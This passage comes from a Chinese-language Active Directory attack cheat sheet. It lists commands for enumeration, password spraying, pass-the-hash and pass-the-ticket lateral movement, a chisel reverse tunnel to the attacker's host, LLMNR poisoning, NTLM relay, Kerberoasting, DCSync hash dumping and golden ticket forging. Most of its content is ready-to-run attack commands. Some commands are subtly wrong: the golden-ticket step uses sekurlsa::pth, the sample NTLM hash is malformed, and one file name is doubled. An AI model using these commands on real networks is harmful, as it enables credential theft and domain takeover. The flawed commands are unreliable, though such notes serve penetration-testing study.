<li><code>./windapsearch.py --dc-ip 172.16.5.5 -u &quot;&quot; -U</code></li>
</ul>
</li>
</ul>
</li>
<li>帳號認證連接：<code>rpcclient -U &quot;username%password&quot; &lt;ip&gt;</code></li>
<li>一次性執行命令：<code>rpcclient -U &quot;&quot; -N 10.7.30.21 -c &quot;&lt;command&gt;&quot;</code></li>
</ul>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="gpo-enumeration">GPO enumeration<a href="#gpo-enumeration" class="hash-link" aria-label="Direct link to GPO enumeration" title="Direct link to GPO enumeration">​</a></h3>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="gpo">GPO<a href="#gpo" class="hash-link" aria-label="Direct link to GPO" title="Direct link to GPO">​</a></h4>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">\\&lt;domain&gt;\SysVol\&lt;domain&gt;\Policie</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">\\&lt;domain&gt;\SysVol\&lt;domain&gt;\Policie\&lt;UID&gt;\Users\Scripts</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">\\&lt;domain&gt;\SysVol\&lt;domain&gt;\Policie\&lt;UID&gt;\Machine\Scripts</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<ul>
<li>群組原則<!-- -->
<ul>
<li><code>Get-NetGPO</code></li>
</ul>
</li>
</ul>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="getuserspnspy">GetUserSPNs[.]py<a href="#getuserspnspy" class="hash-link" aria-label="Direct link to GetUserSPNs[.]py" title="Direct link to GetUserSPNs[.]py">​</a></h3>
<ul>
<li>用來查詢網域內用戶註冊的 SPN<!-- -->
<ul>
<li><code>Import-Module .\GetUserSPN.ps1</code></li>
</ul>
</li>
<li>發動 Kerberoasting 前偵查</li>
</ul>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="kerbrute">Kerbrute<a href="#kerbrute" class="hash-link" aria-label="Direct link to Kerbrute" title="Direct link to Kerbrute">​</a></h3>
<ul>
<li>製作密碼噴灑的 username lists：<code>kerbrute userenum -d domain.local --dc &lt;dc-ip&gt; /wordlists.txt</code></li>
</ul>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="windows-adreconps1">Windows ADRecon.ps1<a href="#windows-adreconps1" class="hash-link" aria-label="Direct link to Windows ADRecon.ps1" title="Direct link to Windows ADRecon.ps1">​</a></h3>
<ul>
<li><a href="https://github.com/adrecon/ADRecon" target="_blank" rel="noopener noreferrer">https://github.com/adrecon/ADRecon</a></li>
<li>usage：<code>powershell.exe –nop –ep bypass .\adrecon.ps1 -DomainController &lt;dc-ip&gt; -Credential &lt;user&gt;/&lt;doamin&gt;</code></li>
<li>Install-windowsfeature RSAT</li>
</ul>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="bloodhoundad">BloodHoundAD<a href="#bloodhoundad" class="hash-link" aria-label="Direct link to BloodHoundAD" title="Direct link to BloodHoundAD">​</a></h3>
<ul>
<li>Windows<!-- -->
<ul>
<li><a href="https://github.com/BloodHoundAD/BloodHound/releases/" target="_blank" rel="noopener noreferrer">https://github.com/BloodHoundAD/BloodHound/releases/</a></li>
<li><code>.\sharphound.exe -c all</code>
<ul>
<li>SharpHound.ps1</li>
<li>自動打包：<code>{Timestamp}_BloodHound.zip</code> --&gt; 拖到視窗</li>
</ul>
</li>
<li>Neo4j Server<!-- -->
<ul>
<li><a href="https://neo4j.com/download-center/#community" target="_blank" rel="noopener noreferrer">https://neo4j.com/download-center/#community</a></li>
<li>path/to/neo4j/bin$ ./neo4j console</li>
<li>啟動後至 localhost:7474 修改預設密碼</li>
<li>預設帳密 neo4j/neo4j 登入 BloodHoundAD</li>
</ul>
</li>
</ul>
</li>
<li>nxc<!-- -->
<ul>
<li><code>nxc ldap &lt;ip&gt; -u user -p pass --bloodhound --collection All</code></li>
<li><code>nxc ldap &lt;ip&gt; -u user -p pass --bloodhound --collection All --dns-server &lt;ip&gt;</code></li>
</ul>
</li>
</ul>
<h1>Lateral Movement(橫向移動)</h1>
<ul>
<li>橫向移動仰賴幾種網域內的驗證方式：<!-- -->
<ul>
<li>NTLM Hash/NTLM v2 Hash</li>
<li>Tickets(Kerberos)</li>
<li>Password</li>
<li>AES256 Keys</li>
</ul>
</li>
</ul>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="smb-1">SMB<a href="#smb-1" class="hash-link" aria-label="Direct link to SMB" title="Direct link to SMB">​</a></h2>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="psexec">psexec<a href="#psexec" class="hash-link" aria-label="Direct link to psexec" title="Direct link to psexec">​</a></h3>
<ul>
<li>SMB 開 shell</li>
<li>第一次使用先接受 eula<!-- -->
<ul>
<li><code>psexec.exe -accepteula</code>：<a href="https://docs.microsoft.com/en-us/sysinternals/downloads/psexec" target="_blank" rel="noopener noreferrer">https://docs.microsoft.com/en-us/sysinternals/downloads/psexec</a></li>
</ul>
</li>
<li>使用 psexec 之前可以先用 smbmap 確認權限</li>
<li>橫向：<!-- -->
<ul>
<li><code>psexec.exe -accepteula \\&lt;ip&gt; -u [&lt;domain&gt;\]&lt;username&gt; -p &lt;password&gt; cmd</code></li>
<li>impacket：<a href="https://github.com/SecureAuthCorp/impacket" target="_blank" rel="noopener noreferrer">https://github.com/SecureAuthCorp/impacket</a>
<ul>
<li><code>impacket-psexec &lt;user&gt;@&lt;ip&gt;</code>(開shell)</li>
<li><code>proxychains psexec.py &lt;username&gt;:&lt;passowrd&gt;@&lt;ip&gt; whoami</code></li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="cmenxc">cme/nxc<a href="#cmenxc" class="hash-link" aria-label="Direct link to cme/nxc" title="Direct link to cme/nxc">​</a></h3>
<ul>
<li><code>crackmapexec smb [IP] -u administrator -p Passw0rd ‐‐exec‐method mmcexec ‐x &#x27;whoami&#x27;</code>
<ul>
<li><code>--exec-method {mmcexec,smbexec,atexec,wmiexec}</code></li>
</ul>
</li>
</ul>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="網路芳鄰">網路芳鄰<a href="#網路芳鄰" class="hash-link" aria-label="Direct link to 網路芳鄰" title="Direct link to 網路芳鄰">​</a></h3>
<ul>
<li>走 <strong>samba</strong> 協議</li>
<li>Domain admin 可以任意觀看</li>
<li><code>\\&lt;ip&gt;\c$</code></li>
<li><code>smbclient -L \\&lt;ip&gt;\c$</code></li>
</ul>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="掛載遠端磁碟">掛載遠端磁碟<a href="#掛載遠端磁碟" class="hash-link" aria-label="Direct link to 掛載遠端磁碟" title="Direct link to 掛載遠端磁碟">​</a></h3>
<ul>
<li>掛載遠端磁碟<!-- -->
<ul>
<li><code>net use \\&lt;ip&gt;\C$ &quot;&lt;password&gt;&quot; /user:&lt;username&gt;</code></li>
</ul>
</li>
<li>查看已掛載的遠端磁碟<!-- -->
<ul>
<li><code>net use</code></li>
</ul>
</li>
<li>Copy 檔案<!-- -->
<ul>
<li><code>copy mimikatz.exe \\&lt;ip&gt;\C$</code></li>
</ul>
</li>
</ul>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="rdp-遠端桌面">RDP 遠端桌面<a href="#rdp-遠端桌面" class="hash-link" aria-label="Direct link to RDP 遠端桌面" title="Direct link to RDP 遠端桌面">​</a></h2>
<ul>
<li>預設 port：TCP/3389</li>
<li>預設情況下，只有 <code>administrator</code> 或 <code>Remote Desktop Users 群組</code> 的成員可以用 RDP 連線。</li>
<li>此外，管理員可以授予特定使用者或群組連接到 RDP 的權限。因為這些權限是在本地設定的，所以枚舉它們的唯一方法是我們在目標電腦上擁有管理權限。</li>
<li><code>Get-ADUser -Filter * | Select-Object -ExpandProperty SamAccountName</code></li>
<li>Enum：<code>nxc rdp &lt;subnet&gt; -u user -p &#x27;password&#x27; -d &lt;domain&gt;.local</code>
<ul>
<li>顯示：<code>Pwn3d!</code> 代表該 user 是我們能夠連進去的</li>
</ul>
</li>
</ul>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="windows">Windows<a href="#windows" class="hash-link" aria-label="Direct link to Windows" title="Direct link to Windows">​</a></h3>
<ul>
<li><code>mstsc.exe</code>
<img decoding="async" loading="lazy" src="https://hackmd.io/_uploads/Byo3wUHc1e.png" alt="image" class="img_ev3q"></li>
</ul>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="abuse-restricted-admin-mode">Abuse Restricted Admin Mode<a href="#abuse-restricted-admin-mode" class="hash-link" aria-label="Direct link to Abuse Restricted Admin Mode" title="Direct link to Abuse Restricted Admin Mode">​</a></h4>
<ul>
<li>需要先提權到 <code>Administrator</code> 群組</li>
<li>Restricted Admin Mode 啟用時連接 RDP 會用 network logon ，而非 interactive logon，這個差異最主要是用來防止被 Credential cache。<!-- -->
<ul>
<li>不過這個特性卻能讓攻擊者做 pass the hash 或 pass the ticket 做橫向移動</li>
</ul>
</li>
<li>確認 R.A.M 是否開啟：<code>reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin</code>
<ul>
<li>有開的話是 <code>0</code></li>
<li>沒開的話是 <code>1</code></li>
</ul>
</li>
<li>如果是 disable 的狀態的話，嘗試開啟：<!-- -->
<ul>
<li><code>reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /d 0 /t REG_DWORD</code></li>
</ul>
</li>
<li>Pass the Ticket：<!-- -->
<ul>
<li>使用前：<code>.\Rubeus.exe createnetonly /program:powershell.exe /show</code></li>
<li>生成銀票：<code>.\Rubeus.exe asktgt /user:&lt;user&gt; /rc4:&lt;NT hash&gt; /domain:&lt;domain&gt;.local /ptt</code>
<ul>
<li>銀票是利用 NT hash 做 key 去加密Kerberos 票證</li>
<li><code>/ptt</code>：直接 inject 到當前 session 中，因此在當前的 powershell 中再打開 <code>mstsc.exe /restrictedAdmin</code> ，即可移動成功。</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="linux">Linux<a href="#linux" class="hash-link" aria-label="Direct link to Linux" title="Direct link to Linux">​</a></h3>
<ul>
<li>xfreerdp 下載：<code>sudo apt-get install freerdp2-x11</code>
<ul>
<li><code>xfreerdp /u:&lt;user&gt; /p:&#x27;&lt;password&gt;&#x27; /v:&lt;Host_IP&gt; /d:&lt;domain&gt;.local /dynamic-resolution /drive:.,linux</code></li>
<li>Optimizing xfreerdp：<code>xfreerdp /u:&lt;user&gt; /p:&#x27;Password&#x27; /d:&lt;domain&gt;.local /v:&lt;ip&gt; /dynamic-resolution /drive:.,linux /bpp:8 /compression -themes -wallpaper /clipboard /audio-mode:0 /auto-reconnect -glyph-cache</code></li>
</ul>
</li>
<li>Pivoting to PTH<!-- -->
<ul>
<li>Linux(目前的主機)：<!-- -->
<ol>
<li><code>vim /etc/proxychains.conf</code></li>
<li><code>./chisel server --reverse </code></li>
</ol>
</li>
<li>Windows(開放rdp的主機)：<!-- -->
<ol>
<li><code>chisel.exe client &lt;VPN IP&gt; R:socks</code></li>
</ol>
</li>
<li>Pass the Hash (Linux --&gt; Windows)：<!-- -->
<ul>
<li><code>proxychains4 -q xfreerdp /u:&lt;user&gt; /pth:&lt;NT hash&gt; /d:&lt;domain&gt;.local /v:&lt;rdp_target_ip&gt;</code></li>
<li>執行完才能拿到該台的shell</li>
</ul>
</li>
</ul>
</li>
<li>Pass the Ticket (Windows --&gt; Windows 也可以 PTH)<!-- -->
<ul>
<li><code>.\Rubeus.exe createnetonly /program:powershell.exe /show</code></li>
<li><code>.\Rubeus.exe asktgt /user:&lt;user&gt; /rc4:&lt;NTLM&gt; /domain:&lt;Domain&gt;.local /ptt</code></li>
<li>連接rdp：<code>mstsc.exe /restrictedAdmin</code></li>
</ul>
</li>
</ul>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="wmi">WMI<a href="#wmi" class="hash-link" aria-label="Direct link to WMI" title="Direct link to WMI">​</a></h2>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="pass-the-hash">Pass the Hash<a href="#pass-the-hash" class="hash-link" aria-label="Direct link to Pass the Hash" title="Direct link to Pass the Hash">​</a></h3>
<p>kali：<code>pth-winexe</code> <a href="https://github.com/byt3bl33d3r/pth-toolkit/tree/master" target="_blank" rel="noopener noreferrer">https://github.com/byt3bl33d3r/pth-toolkit/tree/master</a></p>
<ul>
<li>無法過 Proxychains</li>
<li>類似 Psexec，但支援以 Hash 代替密碼</li>
<li>usage：<code>pth-winexe -U &lt;domain&gt;/&lt;username&gt;%aad3b435b51404eeaad3b435b51404ee(LM_Hash):&lt;NTLM Hash&gt; //&lt;IP&gt; cmd.exe</code></li>
</ul>
<p>On Windows：
<code>wmiexec.exe</code>：<a href="https://github.com/maaaaz/impacket-examples-windows/blob/master/wmiexec.exe" target="_blank" rel="noopener noreferrer">https://github.com/maaaaz/impacket-examples-windows/blob/master/wmiexec.exe</a></p>
<p><code>wmiexec.exe -hashes &lt;LM&gt;:&lt;NTLM&gt; &lt;domain&gt;/&lt;username&gt;@&lt;ip&gt; &lt;command&gt;</code></p>
<ul>
<li>Mimikatz：<!-- -->
<ul>
<li>must dump hashes first：<code>sekurlsa::pth/user:Administrator/domain:atomic.local/ntlm:cc36cf7a8514893efccd3324464tkg1a</code></li>
<li>Kerberos Ticket attack
<code>kerberos::ptt Administrator@krbtgt-atomic.LOCAL.kirbi</code></li>
</ul>
</li>
</ul>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="winrm">WINRM<a href="#winrm" class="hash-link" aria-label="Direct link to WINRM" title="Direct link to WINRM">​</a></h2>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="powershell-remotingwindows-remote-management">PowerShell Remoting(Windows Remote Management)<a href="#powershell-remotingwindows-remote-management" class="hash-link" aria-label="Direct link to PowerShell Remoting(Windows Remote Management)" title="Direct link to PowerShell Remoting(Windows Remote Management)">​</a></h3>
<blockquote>
<ul>
<li>PowerShell Remoting only allows connections from members of the Administrators group</li>
<li>Members of the Remote Management Users group can access WMI resources over management protocols</li>
</ul>
</blockquote>
<ul>
<li>PowerShell Remoting (and WinRM) listen on the following ports:<!-- -->
<ul>
<li>HTTP:5985</li>
<li>HTTPS:5986</li>
</ul>
</li>
<li>Recon：<!-- -->
<ul>
<li><code>crackmapexec winrm &lt;host_ip&gt; -u user.list -p password.list</code></li>
</ul>
</li>
<li>tools：<a href="https://github.com/Hackplayers/evil-winrm" target="_blank" rel="noopener noreferrer">https://github.com/Hackplayers/evil-winrm</a>
<ul>
<li><code>sudo gem install evil-winrm</code></li>
<li><code>evil-winrm -i &lt;target-IP&gt; -u &lt;username&gt; -p &lt;password&gt;</code></li>
</ul>
</li>
</ul>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="dcom">DCOM<a href="#dcom" class="hash-link" aria-label="Direct link to DCOM" title="Direct link to DCOM">​</a></h2>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="ssh">SSH<a href="#ssh" class="hash-link" aria-label="Direct link to SSH" title="Direct link to SSH">​</a></h2>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="mssql">MSSQL<a href="#mssql" class="hash-link" aria-label="Direct link to MSSQL" title="Direct link to MSSQL">​</a></h2>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="exchange">Exchange<a href="#exchange" class="hash-link" aria-label="Direct link to Exchange" title="Direct link to Exchange">​</a></h2>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="sccm">SCCM<a href="#sccm" class="hash-link" aria-label="Direct link to SCCM" title="Direct link to SCCM">​</a></h2>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="llmnr--nbt-ns-poisoning">LLMNR &amp; NBT-NS Poisoning<a href="#llmnr--nbt-ns-poisoning" class="hash-link" aria-label="Direct link to LLMNR &amp; NBT-NS Poisoning" title="Direct link to LLMNR &amp; NBT-NS Poisoning">​</a></h2>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="linux-1">Linux<a href="#linux-1" class="hash-link" aria-label="Direct link to Linux" title="Direct link to Linux">​</a></h3>
<ul>
<li>Responder：<a href="https://github.com/SpiderLabs/Responder" target="_blank" rel="noopener noreferrer">https://github.com/SpiderLabs/Responder</a> (Kali 預設有裝)</li>
<li><code>responder -I &lt;網卡&gt;</code></li>
</ul>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="windows-1">Windows<a href="#windows-1" class="hash-link" aria-label="Direct link to Windows" title="Direct link to Windows">​</a></h3>
<ul>
<li>Inveigh.ps1：<a href="https://github.com/Kevin-Robertson/Inveigh" target="_blank" rel="noopener noreferrer">https://github.com/Kevin-Robertson/Inveigh</a></li>
<li>1.<code>Import-Module .\Inveigh.ps1</code></li>
<li>2.<code>Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y</code></li>
<li>查看利用參數：<code>(Get-Command Invoke-Inveigh).Parameters</code></li>
<li>獲取 NTLM Hash</li>
</ul>
<h1>Exploitation</h1>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="krbrelayup">KrbRelayUp<a href="#krbrelayup" class="hash-link" aria-label="Direct link to KrbRelayUp" title="Direct link to KrbRelayUp">​</a></h2>
<ul>
<li><a href="https://github.com/dirkjanm/krbrelayx" target="_blank" rel="noopener noreferrer">https://github.com/dirkjanm/krbrelayx</a></li>
<li><a href="https://github.com/Dec0ne/KrbRelayUp" target="_blank" rel="noopener noreferrer">https://github.com/Dec0ne/KrbRelayUp</a></li>
<li>在未強制執行LDAP簽名的域環境中可以運作</li>
</ul>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="davrelayup">DavRelayUp<a href="#davrelayup" class="hash-link" aria-label="Direct link to DavRelayUp" title="Direct link to DavRelayUp">​</a></h2>
<ul>
<li><a href="https://github.com/Dec0ne/DavRelayUp" target="_blank" rel="noopener noreferrer">https://github.com/Dec0ne/DavRelayUp</a></li>
<li>透過啟用從 WebDAV 到 LDAP 的 NTLM 中繼來擴展攻擊。它利用基於資源的約束委派 (RBCD) 在加入網域的 Windows 工作站上做 LPE，同時也針對沒有 LDAP signature 的環境。</li>
</ul>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="password-spraying密碼噴灑">Password Spraying(密碼噴灑)<a href="#password-spraying密碼噴灑" class="hash-link" aria-label="Direct link to Password Spraying(密碼噴灑)" title="Direct link to Password Spraying(密碼噴灑)">​</a></h2>
<ul>
<li>Recon：cme, rpcclient, enum4linux, ldap, powerview... 取得帳號</li>
<li>已知很多帳號，嘗試一種密碼做嘗試</li>
</ul>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="linux-2">Linux<a href="#linux-2" class="hash-link" aria-label="Direct link to Linux" title="Direct link to Linux">​</a></h3>
<ul>
<li>CrackMapExec：<a href="https://github.com/byt3bl33d3r/CrackMapExec" target="_blank" rel="noopener noreferrer">https://github.com/byt3bl33d3r/CrackMapExec</a>
<ul>
<li><code>cme {protocol} {target(s)} -u &lt;usernames_lists&gt; -p &lt;passwords_lists&gt;</code></li>
<li><code>cme {protocol} {target(s)} -u &lt;usernames_lists&gt; -p &lt;passwords_lists&gt; --no-bruteforce</code></li>
</ul>
</li>
<li>rpcclient：<!-- -->
<ul>
<li>bash：<code>for u in $(cat valid_users.txt);do rpcclient -U &quot;$u%Welcome1&quot; -c &quot;getusername;quit&quot; &lt;dc-ip&gt; | grep Authority; done</code>
<ul>
<li><code>grep Authority</code> 是用來過濾有效登入</li>
</ul>
</li>
</ul>
</li>
<li>kerbrute：<!-- -->
<ul>
<li><code>kerbrute passwordspray -d &lt;domain&gt;.local --dc &lt;dc-ip&gt; valid_users.txt  &lt;password&gt;</code></li>
</ul>
</li>
<li>sprayhound
<code>sprayhound -U users.txt -d &lt;domain&gt; -dc &lt;dc_ip&gt; --lower</code></li>
</ul>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="windows-2">Windows<a href="#windows-2" class="hash-link" aria-label="Direct link to Windows" title="Direct link to Windows">​</a></h3>
<ul>
<li><a href="https://github.com/dafthack/DomainPasswordSpray" target="_blank" rel="noopener noreferrer">https://github.com/dafthack/DomainPasswordSpray</a>
<ul>
<li><code>Import-Module .\DomainPasswordSpray.ps1</code></li>
<li><code>Invoke-DomainPasswordSpray -Password &lt;password&gt; -OutFile spray_success -ErrorAction SilentlyContinue</code>
<ul>
<li>在網域內噴灑不用</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="smb-relay--ntlm-relay">SMB Relay / NTLM Relay<a href="#smb-relay--ntlm-relay" class="hash-link" aria-label="Direct link to SMB Relay / NTLM Relay" title="Direct link to SMB Relay / NTLM Relay">​</a></h2>
<ul>
<li>Pre-work：<code>sudo vim /etc/responder/Responder.conf</code>
<ul>
<li><code>SMB = Off</code></li>
</ul>
</li>
<li>列舉 <strong>SMB signing disabled</strong> 或 設置為 <strong>&quot;not required&quot;</strong> 的 user：</li>
</ul>
<ol>
<li><code>nmap -sSV -p 445 -script smb2-security-mode &lt;subnet&gt;</code></li>
<li><code>crackmapexec smb &lt;ip_or_ip_range&gt; --gen-relay-list relay.txt</code></li>
<li><code>impacket-ntlmrelayx -tf relay.txtrelay.txt.txt -of netntlm -smb2support -socks</code></li>
</ol>
<ul>
<li>已知 NTLM Relay 漏洞：<!-- -->
<ul>
<li><a href="https://github.com/Wh04m1001/DFSCoerce" target="_blank" rel="noopener noreferrer">DFSCoerce</a></li>
<li><a href="https://github.com/topotam/PetitPotam" target="_blank" rel="noopener noreferrer">CVE-2021-36942 - PetitPotam</a></li>
<li><a href="https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py" target="_blank" rel="noopener noreferrer">Printer Bug (MS-RPRN 濫用)</a></li>
<li><a href="https://github.com/ThemeHackers/CVE-2024-21413" target="_blank" rel="noopener noreferrer">https://github.com/ThemeHackers/CVE-2024-21413</a></li>
<li><a href="https://github.com/Trackflaw/CVE-2023-23397" target="_blank" rel="noopener noreferrer">https://github.com/Trackflaw/CVE-2023-23397</a></li>
<li><a href="https://github.com/duy-31/CVE-2023-35636" target="_blank" rel="noopener noreferrer">https://github.com/duy-31/CVE-2023-35636</a></li>
</ul>
</li>
</ul>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="kerberoasting">Kerberoasting<a href="#kerberoasting" class="hash-link" aria-label="Direct link to Kerberoasting" title="Direct link to Kerberoasting">​</a></h2>
<ul>
<li>控制任一個網域使用者後可以進行</li>
<li>Recon (拿user name lists)：<!-- -->
<ul>
<li><code>crackmapexec smb {ip} --users (smb username)</code></li>
<li><code>nmap -p 88 --script=krb5-enum-users --script-args=&quot;krb5-enum-users.realm=&#x27;&lt;domain&gt;&#x27;,userdb=&lt;user.txt&gt;&quot; &lt;ip&gt;</code></li>
</ul>
</li>
<li>exploit：<code>impacket-GetUserSPNs {domain}\{name}:{[password]} -dc-ip {dc-ip} -request -outputfile hash</code></li>
</ul>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="as-rep-roasting">AS-REP Roasting<a href="#as-rep-roasting" class="hash-link" aria-label="Direct link to AS-REP Roasting" title="Direct link to AS-REP Roasting">​</a></h2>
<ul>
<li><code>GetNPUsers.py &lt;Domain&gt;/ -no-pass -usersfile &lt;users_file&gt;</code></li>
</ul>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="kerberos-delegation">Kerberos Delegation<a href="#kerberos-delegation" class="hash-link" aria-label="Direct link to Kerberos Delegation" title="Direct link to Kerberos Delegation">​</a></h2>
<ol>
<li>Unconstrained Delegation
<img decoding="async" loading="lazy" src="https://hackmd.io/_uploads/H1I-QWtpC.png" alt="image" class="img_ev3q"></li>
</ol>
<blockquote>
<p>Graphic: Kerberos Unconstrained Delegation Communication Flow
圖片來源：<a href="https://adsecurity.org/?p=1667" target="_blank" rel="noopener noreferrer">https://adsecurity.org/?p=1667</a></p>
</blockquote>
<ol start="2">
<li>Constrained Delegation<!-- -->
<ul>
<li>經過授權的帳號，可以在限制下模擬存取、寫入其它服務。</li>
<li>需要管理員權限</li>
</ul>
</li>
<li>Resource Based Constrained Delegation(RBCD)</li>
</ol>
<ul>
<li>Information gathering：<code>impacket-findDelegation {domain}/{user}:{password}</code>
<ul>
<li><code>Constrained w/ Protocol Transition</code> <code>CIFS/...</code></li>
</ul>
</li>
<li><code>impacket-getST -spn CIFS/... -impersonate administrator {domain}/{user}:{passowrd}</code>
<ul>
<li>模擬 <code>administrator</code> 權限</li>
</ul>
</li>
</ul>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="acl-abuse">ACL Abuse<a href="#acl-abuse" class="hash-link" aria-label="Direct link to ACL Abuse" title="Direct link to ACL Abuse">​</a></h2>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="acl-enum">ACL Enum<a href="#acl-enum" class="hash-link" aria-label="Direct link to ACL Enum" title="Direct link to ACL Enum">​</a></h3>
<ul>
<li><code>Find-InterestingDomainAcl</code></li>
<li></li>
</ul>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="dcsync">DcSync<a href="#dcsync" class="hash-link" aria-label="Direct link to DcSync" title="Direct link to DcSync">​</a></h2>
<ul>
<li><a href="https://www.modb.pro/db/108846" target="_blank" rel="noopener noreferrer">https://www.modb.pro/db/108846</a></li>
</ul>
<div class="theme-admonition theme-admonition-info admonition_xJq3 alert alert--info"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 14 16"><path fill-rule="evenodd" d="M7 2.3c3.14 0 5.7 2.56 5.7 5.7s-2.56 5.7-5.7 5.7A5.71 5.71 0 0 1 1.3 8c0-3.14 2.56-5.7 5.7-5.7zM7 1C3.14 1 0 4.14 0 8s3.14 7 7 7 7-3.14 7-7-3.14-7-7-7zm1 3H6v5h2V4zm0 6H6v2h2v-2z"></path></svg></span>info</div><div class="admonitionContent_BuS1"><ul>
<li>本地址用者資料庫 C:\windows\system32\config\SAM<!-- -->
<ul>
<li>見 <strong>Windows 後滲透</strong></li>
</ul>
</li>
<li>網域使用者資料庫 C:\Windows\NTDS\NTDS.dit<!-- -->
<ul>
<li><strong>DcSync</strong> 就是把 <strong>NTDS.dit</strong> 的資料導出來</li>
</ul>
</li>
</ul></div></div>
<ul>
<li>發動條件：有 <strong>Domain Admin</strong> 權限 或 具有<code>Replicating Directory Changes</code> 或 <code>Replicating Directory Changes All</code> 才能應用此攻擊 (擁有 Administrators、Domain Controllers 或 Enterprise Domain Admins 群組內的使用者權限)</li>
</ul>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="dumping-hash">Dumping Hash<a href="#dumping-hash" class="hash-link" aria-label="Direct link to Dumping Hash" title="Direct link to Dumping Hash">​</a></h3>
<ul>
<li>cme：<code>nxc smb &lt;dc_ip&gt; -H &lt;hash&gt; -d &lt;domain&gt; -u &lt;username&gt; --ntds</code></li>
<li>Mimikatz<!-- -->
<ul>
<li>切到 Domain Admin 帳戶 (會彈出新的 cmd 視窗)<!-- -->
<ol>
<li><code>privilege::debug</code></li>
<li><code>sekurlsa::pth /user:&lt;username&gt; /domain:&lt;domain&gt; /ntlm:&lt;ntlm&gt;</code></li>
<li>再啟用後：<code>lsadump::dcsync /all</code></li>
</ol>
</li>
</ul>
</li>
<li>secretsdump<!-- -->
<ul>
<li><code>python3 impacket-secretsdump &lt;Domain&gt;/administrator:&lt;Domiain_admin_password&gt;@&lt;ip&gt; -dc-ip &lt;dc_ip&gt; -just-dc-user administrator</code></li>
</ul>
</li>
</ul>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="generating-golden-ticket">Generating Golden ticket<a href="#generating-golden-ticket" class="hash-link" aria-label="Direct link to Generating Golden ticket" title="Direct link to Generating Golden ticket">​</a></h3>
<ul>
<li>
<p>Golden Ticket 是一種特權 Kerberos TGT（Ticket Granting Ticket），允許攻擊者假冒域內的任何用戶，並在域內擁有最高權限。</p>
</li>
<li>
<p>透過上述 Dumping Hash 攻擊獲得 (krbtgt的) NTLM hash 之後，接著可以製作 Golden Ticket</p>
</li>
<li>
<p>On Windows：</p>
<ul>
<li>mimikatz：<!-- -->
<ul>
<li><code>lsadump::dcsync /domain:&lt;domain&gt; /user:krbtgt</code></li>
<li>生成：<code>sekurlsa::pth /user:administrator /domain:example.com /ntlm:KRBTGT_NTLM_HASH /sid:S-1-5-21-XXXXXXX-XXXXXXX-XXXXXXX /target:example.com /groups:513 /ticket:golden.kirbi</code></li>
<li>注入 Golden Ticket：<code>kerberos::ptt golden.kirbi</code></li>
<li>成功拿下最高權限</li>
</ul>
</li>
</ul>
</li>
<li>
<p>On Linux：
